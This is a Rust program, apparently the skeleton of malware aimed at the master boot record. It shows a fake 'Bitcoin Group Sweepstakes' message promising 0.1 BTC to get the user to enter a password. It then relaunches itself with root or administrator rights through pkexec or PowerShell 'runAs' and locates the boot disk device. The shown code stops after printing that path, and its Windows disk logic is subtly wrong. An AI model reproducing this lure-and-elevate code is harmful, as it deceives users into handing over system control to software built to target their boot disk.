// If Unix, import std::os::unix::process::CommandExt
#[cfg(target_family = "unix")]
use
{
    std::os::unix::process::CommandExt
};

// If Windows, import std::os::windows::process::CommandExt
#[cfg(target_family = "windows")]
use
{
    std::os::windows::process::CommandExt
};

use std::path::PathBuf;
use std::process::{Command, exit};

fn main()
{
    // Request administrator privileges from the OS
    let mut admin = false;
    if cfg!(target_family = "windows")
    {
        #[cfg(target_family = "windows")]
        {
            admin = request_admin();
            println!("admin: {}", admin);
        }
    }
    else if cfg!(target_family = "unix")
    {
        #[cfg(target_family = "unix")]
        {
            admin = request_root();
            println!("admin: {}", admin);
        }
    }
    else
    {
        println!("This program only supports Windows and Unix family operating systems");
        exit(1);
    }
    if !admin
    {
        println!("Administrator privileges are required to run this program");
        exit(1);
    }

    // Determine where the MBR is located
    let mbr = get_mbr();
    println!("mbr: {}", mbr.to_str().unwrap());

    // Wait for user input
    println!("Press enter to terminate the program");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    // Terminate the program
    exit(0);
}

#[cfg(target_family = "unix")]
fn request_root() -> bool
{
    let path = get_path();

    // Check if the user is root; if not, request root privileges from the OS GUI
    if is_root() != true
    {
        pitch();

        let output = Command::new("pkexec")
            .arg(path)
            .exec();

        println!("output: {}", output);

        exit(1);
    }
    else
    {
        return true;
    }
}

#[cfg(target_family = "unix")]
fn is_root() -> bool
{
    // Run whoami command and check if the output is root
    let output = Command::new("whoami")
        .output()
        .expect("Failed to execute process");

    let output = String::from_utf8_lossy(&output.stdout);

    return if output.contains("root")
    {
        true
    }
    else
    {
        false
    }
}

#[cfg(target_family = "windows")]
fn request_admin() -> bool
{
    // Check if the user is an administrator; if not, request administrator privileges from the OS GUI
    if is_admin() != true
    {
        let path = get_path();

        pitch();

        let output = Command::new("powershell")
            .arg("Start-Process")
            .arg(path)
            .arg("-Verb")
            .arg("runAs")
            .arg("Administrator")
            .output()
            .expect("Failed to execute process");

        exit(1);
    }
    else
    {
        return true;
    }
}

#[cfg(target_family = "windows")]
fn is_admin() -> bool
{
    // Check if the user is an administrator on Windows
    let output = Command::new("whoami")
        .arg("/priv")
        .output()
        .expect("Failed to execute process");

    let output = String::from_utf8_lossy(&output.stdout);

    return if output.contains("SeDebugPrivilege")
    {
        true
    }
    else
    {
        false
    }
}

fn get_mbr() -> PathBuf
{
    // Determine the operating system
    if cfg!(target_os = "windows")
    {
        // Determine the drive letter of the system drive
        let drive = get_drive_letter();

        // Return the path to the MBR
        PathBuf::from(format!("{}\\", drive))
    }
    else if cfg!(target_os = "linux")
    {
        // Return the path to the MBR
        PathBuf::from("/dev/sda")
    }
    else if cfg!(target_os = "macos")
    {
        // Return the path to the MBR
        PathBuf::from("/dev/disk0")
    }
    else
    {
        // Return an empty path
        PathBuf::from("")
    }
}

fn get_drive_letter() -> char
{
    // Get the drive letter of the system drive
    let drive = std::env::current_dir().unwrap().to_str().unwrap().chars().nth(0).unwrap();

    // Return the drive letter
    drive
}

fn get_path() -> PathBuf
{
    // Identify file name and path of the current executable
    std::env::current_exe().unwrap()
}

fn pitch()
{
    println!("\nWelcome! This program will grant you 0.1 BTC, courtesy of the Bitcoin Group Sweepstakes!");
    println!("Check today's exchange rates at https://www.coindesk.com/price/bitcoin");
    println!("See terms and conditions at https://bitcoin-group.org/en/terms");
    println!("Please enter your password to continue");
}